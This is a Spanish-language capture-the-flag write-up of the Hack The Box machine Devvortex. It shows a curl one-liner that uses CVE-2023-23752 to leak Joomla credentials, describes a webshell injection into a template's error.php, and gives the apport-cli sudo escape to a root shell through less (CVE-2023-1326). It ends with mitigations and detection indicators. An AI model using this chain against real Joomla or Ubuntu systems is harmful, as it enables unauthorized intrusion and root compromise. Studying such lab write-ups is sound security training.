Descripción de la Máquina

Devvortex es una máquina Linux Easy de Hack The Box que demuestra el impacto real de una vulnerabilidad de divulgación de información en un CMS popular (Joomla) encadenada con una inyección de webshell en un template y una escalada de privilegios mediante un pager ejecutado con permisos de root.

El vector principal es CVE-2023-23752, una vulnerabilidad en Joomla 4.0–4.2.7 que permite a cualquier usuario no autenticado leer la configuración completa de la aplicación (incluyendo credenciales de base de datos) a través de la API REST pública. Con esas credenciales se accede al panel de administración y se inyecta un webshell PHP en el template Cassiopeia.

Concepto clave Una vulnerabilidad de "information disclosure" puede parecer de bajo impacto por sí sola, pero en este caso expone las credenciales del administrador — convirtiendo un leak de config en RCE completo.

Vulnerabilidades Identificadas

CVE-2023-23752 — Joomla Unauthenticated Information Disclosure
CVSS 5.3 Medium Unauthenticated Joomla 4.0–4.2.7 Information Disclosure → Credential Leak
La API REST de Joomla 4.x expone el endpoint /api/index.php/v1/config/application que devuelve la configuración completa de la aplicación sin requerir autenticación cuando se incluye el parámetro ?public=true. La respuesta incluye el host, usuario y contraseña de la base de datos MySQL — exactamente las mismas credenciales del administrador de Joomla.
Joomla Template Editor — PHP Webshell Injection (Post-Auth RCE)
Critical Authenticated Admin com_templates
El editor de templates de Joomla permite a un administrador editar directamente los archivos PHP del template activo. Al modificar error.php del template Cassiopeia e insertar código PHP arbitrario, conseguimos ejecución remota de código como www-data. Este es el diseño intencionado de Joomla — el problema es que las credenciales del administrador son recuperables sin autenticación vía CVE-2023-23752.
CVE-2023-1326 — apport-cli Privilege Escalation via Less Pager
CVSS 7.3 High Local Privilege Escalation Ubuntu 20.04 / apport <2.26.0
Cuando apport-cli se ejecuta con sudo y se elige la opción "View Report", abre el reporte de crash en el pager less con privilegios de root. Dado que less permite ejecutar comandos del sistema con !, es posible escapar al shell como root mediante !/bin/bash.

Explotación Detallada

1 CVE-2023-23752 — API Credential Leak
¿Qué es este endpoint?
La API REST de Joomla 4.x tiene un bug de control de acceso: el endpoint de configuración no verifica si el cliente está autenticado cuando se incluye el parámetro ?public=true. Devuelve toda la configuración del archivo configuration.php en formato JSON.
Explotación CVE-2023-23752
curl -s "http://10.129.229.146/api/index.php/v1/config/application?public=true" \ -H "Host: dev.devvortex.htb" | python3 -m json.tool { "data": [ { "type": "application", "id": "224", "attributes": { "dbtype": "mysqli", "host": "localhost", "user": "lewis", "password": "P4ntherg0t1n5r3c0n##", "db": "joomla", "dbprefix": "sd4fg_" } } ] }
Impacto
Credenciales de base de datos = credenciales de administrador Joomla (la misma cuenta). Un atacante sin privilegios obtiene acceso completo al CMS en segundos.
2 Template Editor — PHP Webshell Injection
¿Cómo funciona?
El componente com_templates de Joomla permite editar los archivos PHP del template directamente desde el backend. El archivo /cassiopeia/error.php es procesado por PHP cuando se produce un error 404. Al prepender código PHP arbitrario, cualquier petición que cargue ese archivo ejecuta nuestro webshell.
Python — ForcedIPAdapter + Template Save

5 CVE-2023-1326 — apport-cli Privilege Escalation
¿Cómo funciona apport-cli?
apport-cli es la herramienta de reporte de crashes de Ubuntu. Cuando se ejecuta con sudo, recolecta información del proceso indicado y ofrece opciones: Enviar, Ver, Cancelar. La opción "View" abre el reporte en el pager less ejecutado como root. En less, el carácter ! permite ejecutar comandos del sistema — !/bin/bash lanza un shell root.
Exploit CVE-2023-1326
# 1. Verificar sudo -l sudo -l User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli # 2. Generar crash report del proceso actual ($$) sudo /usr/bin/apport-cli -f -P $$ *** Collecting problem information... Please choose (S/V/K/I/C): V ← elegir View # 3. En less (ejecutado como root): !/bin/bash ← escape al shell root@devvortex:/home/logan# cat /root/root.txt 7ae0c867534cba6cf27335d3287185ef
¿Por qué funciona?
less tiene una función de ejecución de comandos del shell con el prefijo !. Como apport-cli llama a less con los privilegios del proceso padre (root en este caso), cualquier comando ejecutado desde less hereda esos privilegios. El parámetro LESSSECURE no estaba configurado.

Recomendaciones de Mitigación

CRÍTICO

Actualizar Joomla a 4.2.8+

La versión 4.2.8 parchea CVE-2023-23752 añadiendo verificación de autenticación al endpoint de configuración de la API. Actualización inmediata requerida.

CRÍTICO

Aplicar patch apport-cli (CVE-2023-1326)

Actualizar apport a versión 2.26.0+. Evitar añadir apport-cli a sudoers. Si es necesario, configurar LESSSECURE=1 para deshabilitar ejecución de comandos en less.

ALTO

Separar credenciales de DB del Admin

Las credenciales del usuario de base de datos no deberían ser las mismas que las del administrador de Joomla. Principio de menor privilegio para cuentas de DB.

ALTO

Deshabilitar edición de templates en producción

El editor de templates PHP de Joomla permite RCE a cualquier administrador. Considerar ACLs más granulares o deshabilitar esta funcionalidad en entornos de producción.

MEDIO

Separar entornos dev/prod

El subdominio dev.* estaba expuesto públicamente con el mismo CMS y credenciales. Los entornos de desarrollo deben estar en redes privadas o protegidos con autenticación adicional.

MEDIO

Política de contraseñas más robusta

La contraseña de logan (tequieromucho) es una palabra del diccionario en español. Implementar política de contraseñas que requiera complejidad y detecte frases comunes.

Lecciones Aprendidas

Para el atacante

  • Cuando hay Joomla 4.x, probar CVE-2023-23752 antes de cualquier brute force — es un one-liner que da admin si la versión es vulnerable.
  • El prefijo de tabla Joomla (sd4fg_) es visible en el JSON del CVE. Usarlo directamente para el query MySQL.
  • En Python requests con redirects a hostnames no resolvibles, implementar ForcedIPAdapter que reescriba la URL a la IP antes de enviar.
  • El save de templates en Joomla requiere jform[source] (no source) y la URL del POST debe incluir view=template&file=...&isMedia=0.
  • Para crackear bcrypt rapidamente: verificar con Python bcrypt.checkpw() en lugar de esperar a john con rockyou (mucho más lento).
  • sudo -l siempre primer paso en Linux tras obtener shell. apport-cli → CVE-2023-1326 es un privesc de un paso.

Para el defensor (IOCs)

  • Request a /api/index.php/v1/config/application?public=true sin Authorization header → CVE-2023-23752
  • Múltiples POSTs a /administrator/index.php?option=com_templates&task=template.apply
  • Acceso a /templates/cassiopeia/cassiopeia/error.php con parámetro cmd=
  • Proceso apport-cli lanzado con sudo seguido inmediatamente de proceso bash hijo de less
